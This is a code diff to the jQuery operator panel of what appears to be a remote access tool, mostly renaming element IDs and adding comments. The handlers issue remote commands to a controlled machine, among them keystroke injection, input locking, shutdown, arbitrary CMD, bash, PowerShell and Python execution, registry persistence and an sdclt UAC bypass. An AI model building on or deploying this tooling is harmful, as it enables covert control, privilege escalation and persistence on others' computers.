-        if ($("#input_direct_components_win_browser").val() !== "") {
-            $(".input_console_command").last().val("browse " + $("#input_direct_components_win_browser").val(), true);
-            triggerAjaxDirectInterface("browse " + $("#input_direct_components_win_browser").val(), true, logOutputCB, undefined);
-            $("#input_direct_components_win_browser").val("");
+    $("#button_direct_components_win_write_browser").click(function () {
+        if ($("#input_direct_components_win_write_browser").val() !== "") {
+            $(".input_console_command").last().val("browse " + $("#input_direct_components_win_write_browser").val(), true);
+            triggerAjaxDirectInterface("browse " + $("#input_direct_components_win_write_browser").val(), true, logOutputCB, undefined);
+            $("#input_direct_components_win_write_browser").val("");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a valid url");
@@ -694,89 +725,88 @@ $(document).ready(function () {
         }
     });
 
-
-
+    // Windows - Write - Inject Keystrokes
     $("#button_direct_classify_win_write_injectKeystrokes").click(function () {
         displaySelectedFunctions("write");
-        displayComponents("injectKeystrokes");
+        displayComponents("injectKeystrokes", "write");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_injectKeystrokes_get").click(function () {
+    $("#button_direct_components_win_write_injectKeystrokes_get").click(function () {
         $(".input_console_command").last().val("inj_valid");
         triggerAjaxDirectInterface("inj_valid", true, injectKeystrokesGetCB, undefined);
     });
-    $("#button_direct_components_win_injectKeystrokes_text").click(function () {
-        if ($("#input_direct_components_win_injectKeystrokes_text").val() !== "") {
-            $(".input_console_command").last().val("inj_t " + $("#input_direct_components_win_injectKeystrokes_text").val(), true);
-            triggerAjaxDirectInterface("inj_t " + $("#input_direct_components_win_injectKeystrokes_text").val(), true, logOutputCB, undefined);
-            $("#input_direct_components_win_injectKeystrokes_text").val("");
+    $("#button_direct_components_win_write_injectKeystrokes_text").click(function () {
+        if ($("#input_direct_components_win_write_injectKeystrokes_text").val() !== "") {
+            $(".input_console_command").last().val("inj_t " + $("#input_direct_components_win_write_injectKeystrokes_text").val(), true);
+            triggerAjaxDirectInterface("inj_t " + $("#input_direct_components_win_write_injectKeystrokes_text").val(), true, logOutputCB, undefined);
+            $("#input_direct_components_win_write_injectKeystrokes_text").val("");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a valid string");
             scrollToTop();
         }
     });
-    $("#button_direct_components_win_injectKeystrokes_button").click(function () {
-        if ($("#input_direct_components_win_injectKeystrokes_button").val() !== "") {
-            $(".input_console_command").last().val("inj_p " + $("#input_direct_components_win_injectKeystrokes_button").val(), true);
-            triggerAjaxDirectInterface("inj_p " + $("#input_direct_components_win_injectKeystrokes_button").val(), true, logOutputCB, undefined);
-            $("#input_direct_components_win_injectKeystrokes_button").val("");
+    $("#button_direct_components_win_write_injectKeystrokes_button").click(function () {
+        if ($("#input_direct_components_win_write_injectKeystrokes_button").val() !== "") {
+            $(".input_console_command").last().val("inj_p " + $("#input_direct_components_win_write_injectKeystrokes_button").val(), true);
+            triggerAjaxDirectInterface("inj_p " + $("#input_direct_components_win_write_injectKeystrokes_button").val(), true, logOutputCB, undefined);
+            $("#input_direct_components_win_write_injectKeystrokes_button").val("");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a valid string");
             scrollToTop();
         }
     });
-    $("#button_direct_components_win_injectKeystrokes_combination").click(function () {
-        if ($("#input_direct_components_win_injectKeystrokes_combination").val() !== "") {
-            $(".input_console_command").last().val("inj_h " + $("#input_direct_components_win_injectKeystrokes_combination").val(), true);
-            triggerAjaxDirectInterface("inj_h " + $("#input_direct_components_win_injectKeystrokes_combination").val(), true, logOutputCB, undefined);
-            $("#input_direct_components_win_injectKeystrokes_combination").val("");
+    $("#button_direct_components_win_write_injectKeystrokes_combination").click(function () {
+        if ($("#input_direct_components_win_write_injectKeystrokes_combination").val() !== "") {
+            $(".input_console_command").last().val("inj_h " + $("#input_direct_components_win_write_injectKeystrokes_combination").val(), true);
+            triggerAjaxDirectInterface("inj_h " + $("#input_direct_components_win_write_injectKeystrokes_combination").val(), true, logOutputCB, undefined);
+            $("#input_direct_components_win_write_injectKeystrokes_combination").val("");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a valid hotkey combination");
             scrollToTop();
         }
     });
-
+    // Linux - Write - Inject Keystrokes
     $("#button_direct_classify_lin_write_injectKeystrokes").click(function () {
         displaySelectedFunctions("write");
-        displayComponents("injectKeystrokes");
+        displayComponents("injectKeystrokes", "write");
         $("#button_direct_components_lin_back").show();
         $("#div_direct_classify_lin").hide();
     });
-    $("#button_direct_components_lin_injectKeystrokes_get").click(function () {
+    $("#button_direct_components_lin_write_injectKeystrokes_get").click(function () {
         $(".input_console_command").last().val("inj_valid");
         triggerAjaxDirectInterface("inj_valid", true, injectKeystrokesGetCB, undefined);
     });
-    $("#button_direct_components_lin_injectKeystrokes_text").click(function () {
-        if ($("#input_direct_components_lin_injectKeystrokes_text").val() !== "") {
-            $(".input_console_command").last().val("inj_t " + $("#input_direct_components_lin_injectKeystrokes_text").val(), true);
-            triggerAjaxDirectInterface("inj_t " + $("#input_direct_components_lin_injectKeystrokes_text").val(), true, logOutputCB, undefined);
-            $("#input_direct_components_lin_injectKeystrokes_text").val("");
+    $("#button_direct_components_lin_write_injectKeystrokes_text").click(function () {
+        if ($("#input_direct_components_lin_write_injectKeystrokes_text").val() !== "") {
+            $(".input_console_command").last().val("inj_t " + $("#input_direct_components_lin_write_injectKeystrokes_text").val(), true);
+            triggerAjaxDirectInterface("inj_t " + $("#input_direct_components_lin_write_injectKeystrokes_text").val(), true, logOutputCB, undefined);
+            $("#input_direct_components_lin_write_injectKeystrokes_text").val("");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a valid string");
             scrollToTop();
         }
     });
-    $("#button_direct_components_lin_injectKeystrokes_button").click(function () {
-        if ($("#input_direct_components_lin_injectKeystrokes_button").val() !== "") {
-            $(".input_console_command").last().val("inj_p " + $("#input_direct_components_lin_injectKeystrokes_button").val(), true);
-            triggerAjaxDirectInterface("inj_p " + $("#input_direct_components_lin_injectKeystrokes_button").val(), true, logOutputCB, undefined);
-            $("#input_direct_components_lin_injectKeystrokes_button").val("");
+    $("#button_direct_components_lin_write_injectKeystrokes_button").click(function () {
+        if ($("#input_direct_components_lin_write_injectKeystrokes_button").val() !== "") {
+            $(".input_console_command").last().val("inj_p " + $("#input_direct_components_lin_write_injectKeystrokes_button").val(), true);
+            triggerAjaxDirectInterface("inj_p " + $("#input_direct_components_lin_write_injectKeystrokes_button").val(), true, logOutputCB, undefined);
+            $("#input_direct_components_lin_write_injectKeystrokes_button").val("");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a valid string");
             scrollToTop();
         }
     });
-    $("#button_direct_components_lin_injectKeystrokes_combination").click(function () {
-        if ($("#input_direct_components_lin_injectKeystrokes_combination").val() !== "") {
-            $(".input_console_command").last().val("inj_h " + $("#input_direct_components_lin_injectKeystrokes_combination").val(), true);
-            triggerAjaxDirectInterface("inj_h " + $("#input_direct_components_lin_injectKeystrokes_combination").val(), true, logOutputCB, undefined);
-            $("#input_direct_components_lin_injectKeystrokes_combination").val("");
+    $("#button_direct_components_lin_write_injectKeystrokes_combination").click(function () {
+        if ($("#input_direct_components_lin_write_injectKeystrokes_combination").val() !== "") {
+            $(".input_console_command").last().val("inj_h " + $("#input_direct_components_lin_write_injectKeystrokes_combination").val(), true);
+            triggerAjaxDirectInterface("inj_h " + $("#input_direct_components_lin_write_injectKeystrokes_combination").val(), true, logOutputCB, undefined);
+            $("#input_direct_components_lin_write_injectKeystrokes_combination").val("");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a valid hotkey combination");
@@ -786,7 +816,7 @@ $(document).ready(function () {
     function injectKeystrokesGetCB(data) {
         let $selector = $("#p_console_output");
         let appendString;
-        appendString = data.data.toString().replace("[*]", "<p1 style='color: #3b78ff'>[*]</p1>");
+        appendString = data["data"].toString().replace("[*]", "<p1 style='color: #3b78ff'>[*]</p1>");
         appendString = String.raw`${appendString}`;
         appendString = appendString.replace(/\n/g, "<br>");
         appendString = appendString + "<br>";
@@ -794,66 +824,64 @@ $(document).ready(function () {
         $selector.scrollTop($selector.prop("scrollHeight"));
     }
 
-
-
+    // Windows - Write - Interface Lock
     $("#button_direct_classify_win_write_interfaceLock").click(function () {
         displaySelectedFunctions("write");
-        displayComponents("interfaceLock");
+        displayComponents("interfaceLock", "write");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_interfaceLock_lock_keyboard").click(function () {
+    $("#button_direct_components_win_write_interfaceLock_lock_keyboard").click(function () {
         $(".input_console_command").last().val("inter_lock key");
         triggerAjaxDirectInterface("inter_lock key", true, logOutputCB, undefined);
     });
-    $("#button_direct_components_win_interfaceLock_lock_mouse").click(function () {
+    $("#button_direct_components_win_write_interfaceLock_lock_mouse").click(function () {
         $(".input_console_command").last().val("inter_lock mouse");
         triggerAjaxDirectInterface("inter_lock mouse", true, logOutputCB, undefined);
     });
-    $("#button_direct_components_win_interfaceLock_unlock_keyboard").click(function () {
+    $("#button_direct_components_win_write_interfaceLock_unlock_keyboard").click(function () {
         $(".input_console_command").last().val("inter_unlock key");
         triggerAjaxDirectInterface("inter_unlock key", true, logOutputCB, undefined);
     });
-    $("#button_direct_components_win_interfaceLock_unlock_mouse").click(function () {
+    $("#button_direct_components_win_write_interfaceLock_unlock_mouse").click(function () {
         $(".input_console_command").last().val("inter_unlock mouse");
         triggerAjaxDirectInterface("inter_unlock mouse", true, logOutputCB, undefined);
     });
 
-
-
+    // Windows - Write - Set Audio
     $("#button_direct_classify_win_write_setAudio").click(function () {
         displaySelectedFunctions("write");
-        displayComponents("setAudio");
+        displayComponents("setAudio", "write");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_setAudio_get").click(function () {
+    $("#button_direct_components_win_write_setAudio_get").click(function () {
         $(".input_console_command").last().val("set_audio_range");
         triggerAjaxDirectInterface("set_audio_range", true, logOutputCB, undefined);
     });
-    $("#button_direct_components_win_setAudio_set").click(function () {
-        if ($("#input_direct_components_win_setAudio_set").val() !== "") {
-            $(".input_console_command").last().val("set_audio " + $("#input_direct_components_win_setAudio_set").val(), true);
-            triggerAjaxDirectInterface("set_audio " + $("#input_direct_components_win_setAudio_set").val(), true, logOutputCB, undefined);
-            $("#input_direct_components_win_setAudio_set").val("");
+    $("#button_direct_components_win_write_setAudio_set").click(function () {
+        if ($("#input_direct_components_win_write_setAudio_set").val() !== "") {
+            $(".input_console_command").last().val("set_audio " + $("#input_direct_components_win_write_setAudio_set").val(), true);
+            triggerAjaxDirectInterface("set_audio " + $("#input_direct_components_win_write_setAudio_set").val(), true, logOutputCB, undefined);
+            $("#input_direct_components_win_write_setAudio_set").val("");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a valid decibel level");
             scrollToTop();
         }
     });
-
+    // Linux - Write - Set Audio
     $("#button_direct_classify_lin_write_setAudio").click(function () {
         displaySelectedFunctions("write");
-        displayComponents("setAudio");
+        displayComponents("setAudio", "write");
         $("#button_direct_components_lin_back").show();
         $("#div_direct_classify_lin").hide();
     });
-    $("#button_direct_components_lin_setAudio").click(function () {
-        if ($("#input_direct_components_lin_setAudio").val() !== "") {
-            $(".input_console_command").last().val("set_audio " + $("#input_direct_components_lin_setAudio").val(), true);
-            triggerAjaxDirectInterface("set_audio " + $("#input_direct_components_lin_setAudio").val(), true, logOutputCB, undefined);
-            $("#input_direct_components_lin_setAudio").val("");
+    $("#button_direct_components_lin_write_setAudio").click(function () {
+        if ($("#input_direct_components_lin_write_setAudio").val() !== "") {
+            $(".input_console_command").last().val("set_audio " + $("#input_direct_components_lin_write_setAudio").val(), true);
+            triggerAjaxDirectInterface("set_audio " + $("#input_direct_components_lin_write_setAudio").val(), true, logOutputCB, undefined);
+            $("#input_direct_components_lin_write_setAudio").val("");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a valid percentage");
@@ -861,51 +889,49 @@ $(document).ready(function () {
         }
     });
 
-
-
+    // Windows - Write - System Status Change
     $("#button_direct_classify_win_write_systemStatusChange").click(function () {
         displaySelectedFunctions("write");
-        displayComponents("systemStatusChange");
+        displayComponents("systemStatusChange", "write");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_systemStatusChange_lock").click(function () {
+    $("#button_direct_components_win_write_systemStatusChange_lock").click(function () {
         $(".input_console_command").last().val("lock");
         triggerAjaxDirectInterface("lock", true, logOutputCB, undefined);
     });
-    $("#button_direct_components_win_systemStatusChange_logout").click(function () {
+    $("#button_direct_components_win_write_systemStatusChange_logout").click(function () {
         $(".input_console_command").last().val("logout");
         triggerAjaxDirectInterface("logout", true, logOutputCB, undefined);
     });
-    $("#button_direct_components_win_systemStatusChange_restart").click(function () {
+    $("#button_direct_components_win_write_systemStatusChange_restart").click(function () {
         $(".input_console_command").last().val("restart");
         triggerAjaxDirectInterface("restart", true, logOutputCB, undefined);
     });
-    $("#button_direct_components_win_systemStatusChange_shutdown").click(function () {
+    $("#button_direct_components_win_write_systemStatusChange_shutdown").click(function () {
         $(".input_console_command").last().val("shutdown");
         triggerAjaxDirectInterface("shutdown", true, logOutputCB, undefined);
     });
 
-
-
+    // Windows - Write - Upload File
     $("#button_direct_classify_win_write_uploadFile").click(function () {
         displaySelectedFunctions("write");
-        displayComponents("uploadFile");
+        displayComponents("uploadFile", "write");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_uploadFile").click(function () {
-        if ($("#input_direct_components_win_uploadFile").val() !== "") {
-            $(".input_console_command").last().val("upload " + $("#input_direct_components_win_uploadFile").val(), true);
-            triggerAjaxDirectInterface("upload " + $("#input_direct_components_win_uploadFile").val(), true, logOutputCB, undefined);
-            $("#input_direct_components_win_uploadFile").val("");
+    $("#button_direct_components_win_write_uploadFile").click(function () {
+        if ($("#input_direct_components_win_write_uploadFile").val() !== "") {
+            $(".input_console_command").last().val("upload " + $("#input_direct_components_win_write_uploadFile").val(), true);
+            triggerAjaxDirectInterface("upload " + $("#input_direct_components_win_write_uploadFile").val(), true, logOutputCB, undefined);
+            $("#input_direct_components_win_write_uploadFile").val("");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a valid directory");
             scrollToTop();
         }
     });
-
+    // Linux - Write - Upload File
     $("#button_direct_classify_lin_write_uploadFile").click(function () {
         displaySelectedFunctions("write");
         displayComponents("uploadFile");
@@ -913,10 +939,10 @@ $(document).ready(function () {
         $("#div_direct_classify_lin").hide();
     });
     $("#button_direct_components_lin_uploadFile").click(function () {
-        if ($("#input_direct_components_lin_uploadFile").val() !== "") {
-            $(".input_console_command").last().val("upload " + $("#input_direct_components_lin_uploadFile").val(), true);
-            triggerAjaxDirectInterface("upload " + $("#input_direct_components_lin_uploadFile").val(), true, logOutputCB, undefined);
-            $("#input_direct_components_lin_uploadFile").val("");
+        if ($("#input_direct_components_lin_write_uploadFile").val() !== "") {
+            $(".input_console_command").last().val("upload " + $("#input_direct_components_lin_write_uploadFile").val(), true);
+            triggerAjaxDirectInterface("upload " + $("#input_direct_components_lin_write_uploadFile").val(), true, logOutputCB, undefined);
+            $("#input_direct_components_lin_write_uploadFile").val("");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a valid directory");
@@ -924,19 +950,18 @@ $(document).ready(function () {
         }
     });
 
-
-
+    // Windows - Write - Wallpaper Change
     $("#button_direct_classify_win_write_wallpaperChanger").click(function () {
         displaySelectedFunctions("write");
-        displayComponents("wallpaperChanger");
+        displayComponents("wallpaperChanger", "write");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_wallpaperChanger").click(function () {
-        if ($("#input_direct_components_win_wallpaperChanger").val() !== "") {
-            $(".input_console_command").last().val("wallpaper " + $("#input_direct_components_win_wallpaperChanger").val(), true);
-            triggerAjaxDirectInterface("wallpaper " + $("#input_direct_components_win_wallpaperChanger").val(), true, logOutputCB, undefined);
-            $("#input_direct_components_win_wallpaperChanger").val("");
+    $("#button_direct_components_win_write_wallpaperChanger").click(function () {
+        if ($("#input_direct_components_win_write_wallpaperChanger").val() !== "") {
+            $(".input_console_command").last().val("wallpaper " + $("#input_direct_components_win_write_wallpaperChanger").val(), true);
+            triggerAjaxDirectInterface("wallpaper " + $("#input_direct_components_win_write_wallpaperChanger").val(), true, logOutputCB, undefined);
+            $("#input_direct_components_win_write_wallpaperChanger").val("");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a valid directory");
@@ -945,7 +970,9 @@ $(document).ready(function () {
     });
 
 
+    // EXECUTE
 
+    // These are all the handlers for singleline and multiline command inputs (multiline ones function like a simplified text editor(Eg: exec_py_script))
     $(document).on('keypress, keydown', '.singleline', function(event) {
         if (this.selectionStart < ScoutGlobals.readOnlyLength) {
             document.getElementById($(this).attr('id')).selectionStart = $(this).val().length;
@@ -1015,7 +1042,7 @@ $(document).ready(function () {
             let valueOfEnterable = $(this).val().slice(this.selectionStart);
             $(this).val($(this).val().slice(0, this.selectionStart));
             insertInputRow(parseInt(index, 10), main_id, index);
-            let $selector = $(main_id + (parseInt(index, 10) + 1).toString())
+            let $selector = $(main_id + (parseInt(index, 10) + 1).toString());
             $selector.val(">>> " + valueOfEnterable);
             $selector.focus();
             document.getElementById($selector.attr('id')).selectionStart = ScoutGlobals.readOnlyLength;
@@ -1051,7 +1078,7 @@ $(document).ready(function () {
         }
     });
     $(document).on('keypress, keydown', '.triggerOnExit', function(event) {
-        if ((event.ctrlKey || event.metaKey) && event.keyCode == 67) {
+        if ((event.ctrlKey || event.metaKey) && event.keyCode === 67) {
             let pythonProgram = "";
             $(this).parent().children().each(function () {
                 pythonProgram = pythonProgram + $(this).val().slice(ScoutGlobals.readOnlyLength) + "\n";
@@ -1061,7 +1088,6 @@ $(document).ready(function () {
         }
     });
     function deleteInputRow(rowId, main_id, index) {
-        //fix this shit
         $(main_id + rowId.toString()).remove();
         for (let i = rowId + 1; i <= $(main_id + "0").parent().children().length; i++) {
             $(main_id + i.toString()).attr('id', main_id.substring(1) + (i - 1).toString());
@@ -1085,39 +1111,36 @@ $(document).ready(function () {
         return this;
     };
 
-
-
+    // Windows - Execute - CMD
     $("#button_direct_classify_win_execute_CMD").click(function () {
         displaySelectedFunctions("execute");
-        displayComponents("CMD");
+        displayComponents("CMD", "execute");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_CMD").click(function () {
-        if ($("#input_direct_components_win_CMD").val().slice(ScoutGlobals.readOnlyLength) !== "") {
-            $(".input_console_command").last().val("exec_c " + $("#input_direct_components_win_CMD").val().slice(ScoutGlobals.readOnlyLength), true);
-            triggerAjaxDirectInterface("exec_c " + $("#input_direct_components_win_CMD").val().slice(ScoutGlobals.readOnlyLength), true, logOutputCB, undefined);
-            $("#input_direct_components_win_CMD").val(">>> ");
+    $("#button_direct_components_win_execute_CMD").click(function () {
+        if ($("#input_direct_components_win_execute_CMD").val().slice(ScoutGlobals.readOnlyLength) !== "") {
+            $(".input_console_command").last().val("exec_c " + $("#input_direct_components_win_execute_CMD").val().slice(ScoutGlobals.readOnlyLength), true);
+            triggerAjaxDirectInterface("exec_c " + $("#input_direct_components_win_execute_CMD").val().slice(ScoutGlobals.readOnlyLength), true, logOutputCB, undefined);
+            $("#input_direct_components_win_execute_CMD").val(">>> ");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a command");
             scrollToTop();
         }
     });
-
-
-
+    // Linux - Execute - Bash
     $("#button_direct_classify_lin_execute_bash").click(function () {
         displaySelectedFunctions("execute");
-        displayComponents("bash");
+        displayComponents("bash", "execute");
         $("#button_direct_components_lin_back").show();
         $("#div_direct_classify_lin").hide();
     });
-    $("#button_direct_components_lin_bash").click(function () {
-        if ($("#input_direct_components_lin_bash").val().slice(ScoutGlobals.readOnlyLength) !== "") {
-            $(".input_console_command").last().val("exec_b " + $("#input_direct_components_lin_bash").val().slice(ScoutGlobals.readOnlyLength), true);
-            triggerAjaxDirectInterface("exec_b " + $("#input_direct_components_lin_bash").val().slice(ScoutGlobals.readOnlyLength), true, logOutputCB, undefined);
-            $("#input_direct_components_lin_bash").val(">>> ");
+    $("#button_direct_components_lin_execute_bash").click(function () {
+        if ($("#input_direct_components_lin_execute_bash").val().slice(ScoutGlobals.readOnlyLength) !== "") {
+            $(".input_console_command").last().val("exec_b " + $("#input_direct_components_lin_execute_bash").val().slice(ScoutGlobals.readOnlyLength), true);
+            triggerAjaxDirectInterface("exec_b " + $("#input_direct_components_lin_execute_bash").val().slice(ScoutGlobals.readOnlyLength), true, logOutputCB, undefined);
+            $("#input_direct_components_lin_execute_bash").val(">>> ");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a command");
@@ -1125,19 +1148,18 @@ $(document).ready(function () {
         }
     });
 
-
-
+    // Windows - Execute - Powershell
     $("#button_direct_classify_win_execute_powershell").click(function () {
         displaySelectedFunctions("execute");
-        displayComponents("powershell");
+        displayComponents("powershell", "execute");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_powershell").click(function () {
-        if ($("#input_direct_components_win_powershell").val().slice(ScoutGlobals.readOnlyLength) !== "") {
-            $(".input_console_command").last().val("exec_p " + $("#input_direct_components_win_powershell").val().slice(ScoutGlobals.readOnlyLength), true);
-            triggerAjaxDirectInterface("exec_p " + $("#input_direct_components_win_powershell").val().slice(ScoutGlobals.readOnlyLength), true, logOutputCB, undefined);
-            $("#input_direct_components_win_powershell").val(">>> ");
+    $("#button_direct_components_win_execute_powershell").click(function () {
+        if ($("#input_direct_components_win_execute_powershell").val().slice(ScoutGlobals.readOnlyLength) !== "") {
+            $(".input_console_command").last().val("exec_p " + $("#input_direct_components_win_execute_powershell").val().slice(ScoutGlobals.readOnlyLength), true);
+            triggerAjaxDirectInterface("exec_p " + $("#input_direct_components_win_execute_powershell").val().slice(ScoutGlobals.readOnlyLength), true, logOutputCB, undefined);
+            $("#input_direct_components_win_execute_powershell").val(">>> ");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a command");
@@ -1145,19 +1167,18 @@ $(document).ready(function () {
         }
     });
 
-
-
+    // Windows - Execute - File
     $("#button_direct_classify_win_execute_file").click(function () {
         displaySelectedFunctions("execute");
-        displayComponents("file");
+        displayComponents("file", "execute");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_file").click(function () {
-        if ($("#input_direct_components_win_file").val() !== "") {
-            $(".input_console_command").last().val("exec_f " + $("#input_direct_components_win_file").val(), true);
-            triggerAjaxDirectInterface("exec_f " + $("#input_direct_components_win_file").val(), true, logOutputCB, undefined);
-            $("#input_direct_components_win_file").val("");
+    $("#button_direct_components_win_execute_file").click(function () {
+        if ($("#input_direct_components_win_execute_file").val() !== "") {
+            $(".input_console_command").last().val("exec_f " + $("#input_direct_components_win_execute_file").val(), true);
+            triggerAjaxDirectInterface("exec_f " + $("#input_direct_components_win_execute_file").val(), true, logOutputCB, undefined);
+            $("#input_direct_components_win_execute_file").val("");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a valid directory");
@@ -1165,56 +1186,55 @@ $(document).ready(function () {
         }
     });
 
-
-
+    // Windows - Execute - Python
     $("#button_direct_classify_win_execute_python").click(function () {
         displaySelectedFunctions("execute");
-        displayComponents("python");
+        displayComponents("python", "execute");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
-        $("#div_direct_components_win_python_command_input").html("You are currently in the python executor scripter, script a chain of python instructions to run, press execute to run (only works if python execute component is loaded)<input type='text' id='input_direct_components_win_python_command_input_0' class='multiline command_input' name='Python' value='>>> ' style='width: 100% !important; height: 25px !important; background-color: #252629 !important; border-radius: 0 !important; margin: 0 !important;' autocomplete='off'>");
+        $("#div_direct_components_win_execute_python_command_input").html("You are currently in the python executor scripter, script a chain of python instructions to run, press execute to run (only works if python execute component is loaded)<input type='text' id='input_direct_components_win_execute_python_command_input_0' class='multiline command_input input_direct_components_win_execute_python_command_input' name='Python' value='>>> ' style='width: 100% !important; height: 25px !important; background-color: #252629 !important; border-radius: 0 !important; margin: 0 !important;' autocomplete='off'>");
     });
-    $("#button_direct_components_win_python_file").click(function () {
-        if ($("#input_direct_components_win_python_file").val() !== "") {
-            $(".input_console_command").last().val("exec_py_file " + $("#input_direct_components_win_python_file").val(), true);
-            triggerAjaxDirectInterface("exec_py_file " + $("#input_direct_components_win_python_file").val(), true, logOutputCB, undefined);
-            $("#input_direct_components_win_python_file").val("");
+    $("#button_direct_components_win_execute_python_file").click(function () {
+        if ($("#input_direct_components_win_execute_python_file").val() !== "") {
+            $(".input_console_command").last().val("exec_py_file " + $("#input_direct_components_win_execute_python_file").val(), true);
+            triggerAjaxDirectInterface("exec_py_file " + $("#input_direct_components_win_execute_python_file").val(), true, logOutputCB, undefined);
+            $("#input_direct_components_win_execute_python_file").val("");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a valid directory");
             scrollToTop();
         }
     });
-    $("#button_direct_components_win_python_command").click(function () {
+    $("#button_direct_components_win_execute_python_command").click(function () {
         let pythonProgram = "";
-        $(".multiline").each(function () {
+        $(".input_direct_components_win_execute_python_command_input").each(function () {
             pythonProgram = pythonProgram + $(this).val().slice(ScoutGlobals.readOnlyLength) + "\n";
         });
         $(".input_console_command").last().val("exec_py " + pythonProgram, true);
         triggerAjaxDirectInterface("exec_py " + pythonProgram, true, logOutputCB, undefined);
     });
-
+    // Linux - Execute - Python
     $("#button_direct_classify_lin_execute_python").click(function () {
         displaySelectedFunctions("execute");
-        displayComponents("python");
+        displayComponents("python", "execute");
         $("#button_direct_components_lin_back").show();
         $("#div_direct_classify_lin").hide();
-        $("#div_direct_components_lin_python_command_input").html("You are currently in the python executor scripter, script a chain of python instructions to run, press execute to run (only works if python execute component is loaded)<input type='text' id='input_direct_components_lin_python_command_input_0' class='multiline command_input' name='Python' value='>>> ' style='width: 100% !important; height: 25px !important; background-color: #252629 !important; border-radius: 0 !important; margin: 0 !important;' autocomplete='off'>");
+        $("#div_direct_components_lin_execute_python_command_input").html("You are currently in the python executor scripter, script a chain of python instructions to run, press execute to run (only works if python execute component is loaded)<input type='text' id='input_direct_components_lin_execute_python_command_input_0' class='multiline command_input input_direct_components_lin_execute_python_command_input' name='Python' value='>>> ' style='width: 100% !important; height: 25px !important; background-color: #252629 !important; border-radius: 0 !important; margin: 0 !important;' autocomplete='off'>");
     });
-    $("#button_direct_components_lin_python_file").click(function () {
-        if ($("#input_direct_components_lin_python_file").val() !== "") {
-            $(".input_console_command").last().val("exec_py_file " + $("#input_direct_components_lin_python_file").val(), true);
-            triggerAjaxDirectInterface("exec_py_file " + $("#input_direct_components_lin_python_file").val(), true, logOutputCB, undefined);
-            $("#input_direct_components_lin_python_file").val("");
+    $("#button_direct_components_lin_execute_python_file").click(function () {
+        if ($("#input_direct_components_lin_execute_python_file").val() !== "") {
+            $(".input_console_command").last().val("exec_py_file " + $("#input_direct_components_lin_execute_python_file").val(), true);
+            triggerAjaxDirectInterface("exec_py_file " + $("#input_direct_components_lin_execute_python_file").val(), true, logOutputCB, undefined);
+            $("#input_direct_components_lin_execute_python_file").val("");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a valid directory");
             scrollToTop();
         }
     });
-    $("#button_direct_components_lin_python_command").click(function () {
+    $("#button_direct_components_lin_execute_python_command").click(function () {
         let pythonProgram = "";
-        $(".multiline").each(function () {
+        $(".input_direct_components_lin_execute_python_command_input").each(function () {
             pythonProgram = pythonProgram + $(this).val().slice(ScoutGlobals.readOnlyLength) + "\n";
         });
         $(".input_console_command").last().val("exec_py " + pythonProgram, true);
@@ -1222,31 +1242,32 @@ $(document).ready(function () {
     });
 
 
+    // PERSIST
 
+    // Windows - Persist - Registry Persistence
     $("#button_direct_classify_win_persist_registryPersistence").click(function () {
         displaySelectedFunctions("persist");
-        displayComponents("registryPersistence");
+        displayComponents("registryPersistence", "persist");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_registryPersistence").click(function () {
+    $("#button_direct_components_win_persist_registryPersistence").click(function () {
         $(".input_console_command").last().val("reg_persist");
         triggerAjaxDirectInterface("reg_persist", true, logOutputCB, undefined);
     });
 
-
-
+    // Windows - Persist - UAC Bypass
     $("#button_direct_classify_win_persist_sdcltUACBypass").click(function () {
         displaySelectedFunctions("persist");
-        displayComponents("sdcltUACBypass");
+        displayComponents("sdcltUACBypass", "persist");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_sdcltUACBypass").click(function () {
-        if ($("#input_direct_components_win_sdcltUACBypass").val() !== "") {
-            $(".input_console_command").last().val("sdclt_uac " + $("#input_direct_components_win_sdcltUACBypass").val(), true);
-            triggerAjaxDirectInterface("sdclt_uac " + $("#input_direct_components_win_sdcltUACBypass").val(), true, logOutputCB, undefined);
-            $("#input_direct_components_win_sdcltUACBypass").val("");
+    $("#button_direct_components_win_persist_sdcltUACBypass").click(function () {
+        if ($("#input_direct_components_win_persist_sdcltUACBypass").val() !== "") {
+            $(".input_console_command").last().val("sdclt_uac " + $("#input_direct_components_win_persist_sdcltUACBypass").val(), true);
+            triggerAjaxDirectInterface("sdclt_uac " + $("#input_direct_components_win_persist_sdcltUACBypass").val(), true, logOutputCB, undefined);
+            $("#input_direct_components_win_persist_sdcltUACBypass").val("");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a valid directory");
@@ -1254,57 +1275,32 @@ $(document).ready(function () {
         }
     });
